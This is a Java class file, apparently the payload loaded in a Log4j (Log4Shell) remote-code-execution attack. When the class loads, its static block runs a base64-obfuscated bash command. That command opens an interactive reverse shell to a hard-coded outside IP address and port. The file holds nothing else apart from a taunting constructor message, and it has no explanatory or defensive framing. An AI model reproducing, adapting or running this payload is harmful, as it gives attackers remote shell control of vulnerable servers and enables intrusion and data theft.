public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvNTEuOTEuMTE5LjE3MC84ODk5IDA+JjEK}|{base64,-d}|{bash,-i}").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
